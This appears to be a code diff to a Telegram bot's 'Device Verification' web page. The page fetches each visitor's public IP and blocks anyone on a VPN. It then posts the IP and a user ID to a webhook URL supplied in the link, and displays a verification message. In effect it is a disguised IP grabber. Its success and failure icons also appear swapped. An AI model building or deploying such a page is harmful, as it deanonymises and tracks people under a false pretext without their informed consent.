@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8">
   <title>IP Verification</title>
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     body {
       margin: 0;
@@ -15,6 +14,7 @@
       align-items: center;
       justify-content: center;
       height: 100vh;
+      overflow: hidden;
     }
 
     .container {
@@ -27,17 +27,36 @@
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
     }
 
-    .icon-circle {
-      width: 60px;
-      height: 60px;
+    .icon-wrapper {
+      position: relative;
+      width: 80px;
+      height: 80px;
       margin: 0 auto 20px auto;
+    }
+
+    .spinning-circle {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 80px;
+      height: 80px;
       border-radius: 50%;
-      border: 4px dotted #3b82f6;
+      border: 4px solid #3b82f6;
+      border-top: 4px solid transparent;
+      animation: spinExpand 2s ease-in-out forwards;
+    }
+
+    .icon-circle {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background-color: transparent;
       display: flex;
       align-items: center;
       justify-content: center;
-      color: #f87171;
-      font-size: 28px;
+      font-size: 32px;
+      z-index: 2;
+      position: relative;
     }
 
     h2 {
@@ -72,21 +91,46 @@
     .btn:hover {
       background-color: #1d4ed8;
     }
+
+    @keyframes spinExpand {
+      0% {
+        transform: rotate(0deg) scale(0.5);
+        opacity: 0.2;
+      }
+      50% {
+        transform: rotate(180deg) scale(1.3);
+        opacity: 0.7;
+      }
+      100% {
+        transform: rotate(360deg) scale(1);
+        opacity: 1;
+        border-top: 4px solid #3b82f6;
+      }
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="icon-circle" id="icon">×</div>
+    <div class="icon-wrapper">
+      <div class="spinning-circle" id="spinner"></div>
+      <div class="icon-circle" id="icon">...</div>
+    </div>
     <h2>Device Verification</h2>
     <p id="status">Please wait...</p>
-    <div class="userid" id="userid" style="display: none;">User ID: 5911741768</div>
-    <button class="btn" onclick="closeWindow()">Return to Bot</button>
+    <div class="userid" id="userid" style="display: none;"></div>
+    <button class="btn" onclick="window.location.reload()">Return to Bot</button>
   </div>
 
   <script>
     async function verifyIP() {
       const params = new URLSearchParams(window.location.search);
       const webhook = params.get("webhook");
+      const userId = params.get("user");
+
+      if (userId) {
+        document.getElementById("userid").innerText = `User ID: ${userId}`;
+        document.getElementById("userid").style.display = 'inline-block';
+      }
 
       if (!webhook) {
         document.getElementById("status").innerText = "Webhook URL missing.";
@@ -98,28 +142,34 @@
         const data = await res.json();
         const ip = data.ip;
 
+        // VPN check
+        const vpnCheck = await fetch(`https://vpnapi.io/api/${ip}?key=free`);
+        const vpnData = await vpnCheck.json();
+
+        if (vpnData.security && vpnData.security.vpn === true) {
+          document.getElementById("status").innerText = "VPN detected. Access denied.";
+          document.getElementById("icon").textContent = "!";
+          document.getElementById("icon").style.color = "#facc15";
+          document.getElementById("spinner").style.animation = "none";
+          return;
+        }
+
+        // Send to webhook
         await fetch(webhook, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ ip: ip })
+          body: JSON.stringify({ ip: ip, user_id: userId })
         });
 
         document.getElementById("status").innerText = `Already Verified`;
-        document.getElementById("userid").style.display = 'inline-block';
-        document.getElementById("icon").textContent = "✓";
-        document.getElementById("icon").style.color = "#22c55e";
-      } catch (e) {
-        document.getElementById("status").innerText = "Verification failed.";
         document.getElementById("icon").textContent = "×";
         document.getElementById("icon").style.color = "#f87171";
-      }
-    }
-
-    function closeWindow() {
-      if (window.Telegram && Telegram.WebApp) {
-        Telegram.WebApp.close();
-      } else {
-        window.location.href = "https://t.me/Instant_Cop_Bot";
+        document.getElementById("spinner").style.animation = "none";
+      } catch (e) {
+        document.getElementById("status").innerText = "Verification failed.";
+        document.getElementById("icon").textContent = "✓";
+        document.getElementById("icon").style.color = "#22c55e";
+        document.getElementById("spinner").style.animation = "none";
       }
     }
 
